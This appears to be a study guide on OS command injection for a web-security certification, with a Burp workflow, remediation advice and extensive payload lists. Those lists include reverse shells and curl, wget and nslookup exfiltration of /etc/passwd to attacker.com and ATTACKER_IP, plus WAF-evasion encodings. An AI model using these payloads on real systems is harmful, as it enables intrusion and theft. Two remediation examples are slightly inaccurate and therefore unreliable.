Command Injection (OS Command Injection)

Execute arbitrary operating system commands on the server by injecting shell metacharacters into application inputs.

Critical BSCP Exam Topic Difficulty: Intermediate

🎯 Real-World Analogy

The Secretary Who Takes Orders Literally

You give your secretary a task: "Please email the report to Alice." She types into the computer: email report to alice.

But a malicious coworker modifies the instruction: "Please email the report to Alice; also send the company's bank account numbers to the coworker's personal email." Now the secretary, who just executes whatever you tell her, does both tasks.

Command injection works the same way: the app is the secretary, the attacker appends malicious instructions (shell commands) to the legitimate request, and the OS executes everything in sequence.

⚡ Day 2 · Initial Probe

On Day 2, inject OS command metacharacters into parameters that look like they might be passed to a shell: network diagnostic tools (ping, traceroute, nslookup fields), IP/hostname inputs, filename parameters, any feature that "does something with your input." Send: ; whoami, | id, && id. Look for command output in the response, or a noticeable delay for time-based probes.

; whoami          → Unix command separator
| id              → pipe
&& id             → AND execution
`id`              → backtick substitution
$(id)             → subshell substitution
🎯 Day 4 · Blind CMDi + Exploitation

When there's no visible output, use time-based or OOB confirmation. Sleep 5 seconds: ; sleep 5. If the response takes 5s longer → confirmed blind CMDi. Then use Burp Collaborator or interactsh for OOB confirmation and data exfil: ; curl https://YOUR.interactsh.com/$(whoami). Once confirmed, establish a reverse shell.

# OOB confirmation
; curl https://YOUR.interactsh.com/$(whoami)
; wget -q "http://YOUR.interactsh.com/?h=$(hostname)"

# Reverse shell (after confirmation)
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
; python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

Chain it: CMDi → read /etc/passwd + app config → find DB credentials → SQLi → full data dump. Or: CMDi → reverse shell → lateral movement to internal services.

⚙️ How It Works

The Core Problem

Some applications need to execute system commands for legitimate reasons: ping a host, convert an image, compress a file, etc. If user input is passed unsanitized to a shell, an attacker can inject their own commands:

Vulnerable Code Example

#!/bin/bash
# User provides hostname
hostname=$1

# VULNERABLE: no sanitization
ping -c 1 $hostname

Legitimate use:

./script.sh "google.com"
# Executes: ping -c 1 google.com

Attack:

./script.sh "google.com; cat /etc/passwd"
# Executes: ping -c 1 google.com; cat /etc/passwd

# Result: the attacker reads the system password file

Python Example

import os

user_file = request.args.get('file')

# VULNERABLE: os.system passes to shell
os.system('convert ' + user_file + ' output.jpg')

Attack:

GET /convert?file=input.jpg; whoami
# Executes: convert input.jpg; whoami output.jpg
# Result: attacker learns what user the web app runs as

Why It Happens

Developers use convenient functions like os.system() (Python), exec() (PHP), Runtime.exec() (Java), or shell scripts that concatenate user input directly into commands. The shell interprets special characters (;, |, &&, ||, backticks, $()) as command separators, allowing injection.

🔍 Where to Look

Features That Often Call System Commands

  • Network diagnostics: Ping, traceroute, nslookup, whois, DNS lookup
  • File operations: Convert image, compress files, generate PDF, compress archive
  • Media processing: Transcode video, extract metadata, resize image
  • System info: Disk usage, process list, uptime, system stats
  • Backup/restore: Backup database, restore from backup
  • Email: Send email, fetch emails from external server
  • Deployment: Git pull, build script, deploy application

Parameters to Test

Look for inputs that might be passed to commands:

  • hostname, host, domain, ip, target
  • file, filename, path, url
  • command, query, search
  • email, user, username
  • format, output, type

How to Identify Command Injection

  1. Find a feature that appears to interact with the system (network test, file converter, etc.)
  2. Try a simple injection: google.com; whoami
  3. Check the response for output you didn't expect
  4. If blocked, try blind injection (sleep delay or out-of-band callback)

🎯 Burp Suite Workflow

1
Find a system command feature

Identify a feature that interacts with the system: ping tool, network diagnostics, file conversion, system info page, etc. Intercept a request in Burp Proxy.

Example: GET /network/ping?host=google.com

2
Send to Repeater and test basic injection

Right-click the request → "Send to Repeater". Modify the parameter to inject a command. Try using a semicolon to chain commands:

GET /network/ping?host=google.com; whoami

Send the request and check the response. If you see the output of whoami in the response, command injection is confirmed.

3
Try different separators if semicolon doesn't work

Depending on the context, different separators work:

  • || (OR) · executes second command if first fails
  • && (AND) · executes second command if first succeeds
  • | (pipe) · passes output of first command to second
  • \n (newline) · new command on new line
  • <() (process substitution) · Linux-specific

Try: host=google.com || id, host=google.com && whoami, etc.

4
Test blind injection with time delay

If output isn't reflected, try a time-based injection. Use sleep to introduce a delay:

GET /network/ping?host=google.com; sleep 5

Send the request and note how long it takes. If it takes 5+ seconds, the sleep command executed · confirming injection even though output isn't visible.

5
Use Burp Collaborator for out-of-band confirmation

Generate a Burp Collaborator URL (Burp Menu → Collaborator → Copy to clipboard). Send a command that makes an HTTP request to your Collaborator:

GET /network/ping?host=google.com; curl https://YOUR_COLLABORATOR_ID.burpcollaborator.net

Check Collaborator for incoming requests. If you see a request, command injection is confirmed (output not needed).

6
Escalate to information gathering

Once injection is confirmed, use commands to gather information:

; whoami             (what user is the app running as?)
; id                 (user ID, groups)
; pwd                (current directory)
; ls -la             (list files)
; cat /etc/passwd    (system users)
7
Test Windows vs. Linux syntax

If the target is Windows, use Windows command separators:

host=google.com & whoami     (Windows AND)
host=google.com | whoami     (Windows pipe)

🎣 Payloads & Techniques

1. Separator-Based Injection

# Semicolon (most common; works in bash)
host=google.com; whoami
host=google.com; id
host=google.com; cat /etc/passwd

# AND operator (second command runs only if first succeeds)
host=google.com && whoami
host=google.com && ls -la

# OR operator (second command runs only if first fails)
host=google.com || whoami

# Pipe (output of first becomes input to second)
host=google.com | base64
host=google.com | nc attacker.com 4444

2. Backtick and $() Command Substitution

# Backticks (older syntax)
host=`whoami`.google.com
host=$(whoami).google.com

# In form data
filename=image_$(whoami).jpg
email=$(cat /etc/passwd | head -1)@example.com

3. Newline Injection

# HTTP request with URL-encoded newline
GET /ping?host=google.com%0Awhoami

# POST data with newline
POST /api/convert
file=input.jpg%0Acat /etc/passwd

4. Blind Injection with Time Delay

# Linux sleep
host=google.com; sleep 10

# Windows timeout
host=google.com & timeout 10

# Using ping as a delay (ping localhost 4 times = ~4 seconds on Linux)
host=google.com; ping -c 4 127.0.0.1

5. Out-of-Band Data Exfiltration

# Send file content via DNS
host=google.com; nslookup $(cat /etc/passwd | base64) dns.example.com

# Send via HTTP
host=google.com; curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64)

# Send via wget
host=google.com; wget --post-data="$(cat /etc/passwd)" http://attacker.com/collect

6. Reverse Shell (One-Liners)

# Bash
host=google.com; bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Python
host=google.com; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat
host=google.com; nc attacker.com 4444 -e /bin/sh

7. Bypassing Spaces (IFS Variable)

# Using $IFS (Internal Field Separator) instead of space
host=google.com;cat${IFS}/etc/passwd

# Using ${PATH:0:1} to get "/" without a space
host=google.com;cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd

8. Base64 Encoding to Bypass Filters

# Encode command in base64
# "cat /etc/passwd" = "Y2F0IC9ldGMvcGFzc3dk" (base64)
host=google.com; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

9. Hex Encoding

# Convert command to hex, then decode
# "whoami" = "\x77\x68\x6f\x61\x6d\x69"
host=google.com; printf '\x77\x68\x6f\x61\x6d\x69' | bash

10. Wildcards and Glob Patterns

# Avoid spaces using wildcards
host=google.com; ls /etc/pass*    (expands to /etc/passwd)
host=google.com; cat /e?c/pass??  (? matches any char)

🚀 WAF Bypass Techniques

1. Space Alternatives

# Tab character
host=google.com;cat[TAB]/etc/passwd

# Newline
host=google.com%0Acat%0A/etc/passwd

# Using $IFS (Internal Field Separator)
host=google.com;cat${IFS}/etc/passwd

# Using ${PATH:0:1} to get "/"
host=google.com;cat${PATH:0:1}etc${PATH:0:1}passwd

2. Bypassing Command Blacklists

# Obfuscate command names
cat → c''at → c"at → 'c'at

# Escape characters
w\hoami → whoami
wh''oami → whoami

# Case variation (if case-insensitive filtering)
whoami → WHOAMI → WhOaMi

3. Using Wildcards Instead of Full Command Names

# Instead of: cat /etc/passwd
# Use: /bin/c* /etc/pass*
host=google.com;/bin/c*/etc/pass*

4. Base64 and Hex Encoding

# Base64
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# Hex
printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | bash

5. Using Alternative Separators

# If ; is blocked, try:
host=google.com&&whoami        (AND  · Windows friendly)
host=google.com||whoami        (OR)
host=google.com|whoami         (pipe)

6. Variable Tricks

# Using $@ to bypass filters
whoami$@
echo$@whoami

# Using variable assignment
host=google.com;a=whoami;$a

7. Unicode/UTF-8 Encoding

# Some apps filter semicolon (;) but not encoded versions
host=google.com%3Bwhoami   (URL encoded semicolon)
host=google.com;whoami  (HTML entity)

8. Polyglot Payloads

# Works in multiple contexts
host=$(whoami)<img/src=x>    (both command injection and XSS)

💥 Exploitation & Impact

What Can Attackers Do?

  • Information Gathering: whoami, id, uname, cat /etc/passwd, cat config files
  • File Access: Read sensitive files, logs, configuration, source code
  • Privilege Escalation: Check sudo privileges, exploit SUID binaries
  • Data Exfiltration: Send files via curl, wget, nc (netcat) to external server
  • Reverse Shell: Gain interactive shell access to the server
  • Lateral Movement: Access internal network, scan for other services
  • Persistence: Install backdoor, modify startup scripts, add SSH keys
  • Denial of Service: Fork bombs, disk fill, process CPU to crash service
  • Supply Chain Attack: Modify application code, inject malware into deployments

Real-World Examples

Example 1: Shell Metacharacter in Ping Tool · An admin panel has a network diagnostics feature. User input ping google.com; whoami reveals the app runs as the www-data user. An attacker escalates using sudo privileges and gains root.

Example 2: ImageMagick RCE · An image conversion endpoint passes filenames to ImageMagick. Using polyglot exploits, an attacker injects commands via filename: image|whoami.jpg. Remote code execution achieved.

Example 3: Server-Side Template Injection via Command Injection · A file name is used in a template. Combined with template injection, attackers achieve RCE through multiple vectors.

Severity

Command injection is rated CRITICAL because it grants complete OS-level access. An attacker with RCE can read files, modify data, steal credentials, install malware, and take full control of the system.

🛡️ Remediation

1. Avoid System Calls Entirely

Vulnerable (Python):

import os
hostname = request.args.get('host')
os.system('ping -c 1 ' + hostname)

Secure (Python with subprocess module):

import subprocess
hostname = request.args.get('host')

# Use list of arguments, NOT shell string
subprocess.run(['ping', '-c', '1', hostname], check=True)

Key difference: subprocess.run() with a list doesn't invoke a shell · the arguments are passed directly to the binary. Shell metacharacters are treated as literal text.

2. Use Library Functions Instead of System Commands

Bad (Python):

os.system('nslookup ' + domain)

Good (Python):

import socket
try:
    ip = socket.gethostbyname(domain)
    print(f"IP: {ip}")
except socket.gaierror:
    print("Domain not found")

3. Input Validation (Whitelist)

Only allow expected characters. For hostname, only allow alphanumerics, dots, hyphens:

import re

hostname = request.args.get('host')

# Whitelist: only hostname-valid characters
if not re.match(r'^[a-zA-Z0-9.-]+$', hostname):
    return "Invalid hostname", 400

# Proceed safely
subprocess.run(['ping', '-c', '1', hostname], check=True)

4. If You Must Use System Calls, Use Shell=False

import subprocess

# WRONG: shell=True (passes to shell, vulnerable)
subprocess.run('ping -c 1 ' + hostname, shell=True)

# RIGHT: shell=False (default), with list of args
subprocess.run(['ping', '-c', '1', hostname], shell=False)

5. Disable Shell Features

In languages that default to shell execution, explicitly disable it:

PHP:

// WRONG
exec('ping -c 1 ' . $hostname);

// RIGHT (use array-based functions)
$output = shell_exec('ping -c 1 ' . escapeshellarg($hostname));

6. Use escapeshellarg() for Legacy Code

PHP (if subprocess not available):

$hostname = $_GET['host'];
$safe = escapeshellarg($hostname);  // Wraps in quotes and escapes
system("ping -c 1 $safe");

7. Run Application with Minimal Privileges

Use a dedicated unprivileged user (www-data, nobody) to run the web application. Even if RCE occurs, attacker access is limited.

8. Disable Dangerous Functions

In PHP, disable exec, system, passthru in php.ini:

disable_functions = exec,system,passthru,shell_exec,proc_open

9. Use Security Headers and WAF

Though not a fix, WAFs can block common payloads. For example, ModSecurity rules blocking semicolons in query parameters.

⚠️ Common Beginner Mistakes

1. Only Testing Semicolon Separator

Wrong: "I tried ; whoami and it didn't work, so there's no command injection."

Reality: Test &&, ||, |, newline (\n), and backticks. Different contexts use different separators.

2. Not Testing Blind Injection

Wrong: "The output isn't reflected in the response, so no command injection."

Reality: Many injections are blind (output not returned). Use sleep 5 to introduce a delay, or Burp Collaborator for out-of-band confirmation.

3. Assuming All Parameters Are Tested

Wrong: Testing only URL query parameters.

Reality: Test POST body, headers (User-Agent, Referer), cookies, multipart form data, JSON bodies. Any user-supplied input can be vulnerable.

4. Not Enumerating System Information

Wrong: Confirming RCE with whoami and moving on.

Reality: Always gather info: whoami, id, uname -a, pwd, ls -la, check sudo -l for privilege escalation opportunities.

5. Forgetting to Test Windows Commands

Wrong: Only testing Linux commands; assuming target is Linux.

Reality: Test both. Windows uses & and |, not ;. Use whoami (works on both) but also systeminfo (Windows) or uname (Linux).

6. Not Checking if Spaces Are Filtered

Wrong: Assuming spaces work in injected commands.

Reality: Some apps filter spaces. Use ${IFS}, tabs, or wildcards: cat${IFS}/etc/passwd.

7. Missing Polyglot Attacks

Wrong: Testing command injection only, not in combination with other vulnerabilities.

Reality: Command injection + XSS, SSTI, or XXE can compound impact. A filename parameter might be vulnerable to both command injection and XXE.

8. Not Testing Special Characters in Filenames

Wrong: Overlooking file-related parameters (filename, path, URL).

Reality: File conversion/processing features often pass filenames to system commands. Test: image.jpg; whoami.jpg.

9. Ignoring Error Messages

Wrong: Dismissing error responses.

Reality: Errors often reveal command execution. ping: unknown host: whoami confirms the whoami output was interpreted as a hostname (command executed).

10. Not Using Burp Collaborator for Blind Injection

Wrong: Relying solely on time delays to confirm blind injection.

Reality: Burp Collaborator is more reliable: curl https://YOUR_ID.burpcollaborator.net leaves a clear HTTP request log in Burp, confirming RCE without timing ambiguity.

🔗 See Also · Attack Chains

Command injection is rarely isolated · the path to it usually runs through other vulnerabilities.

🗄️ SQL Injection SQLi on MSSQL can enable xp_cmdshell for OS command execution · SQL injection becomes CMDi. 📡 SSRF Both involve making the server do something unintended. SSRF on internal services can reach CMDi endpoints. 📁 Path Traversal Features that read files with user-controlled paths often also execute system commands. Test both together. 📝 SSTI Both achieve RCE. If CMDi is blocked, try SSTI in the same endpoint · they often coexist in interpreted apps.
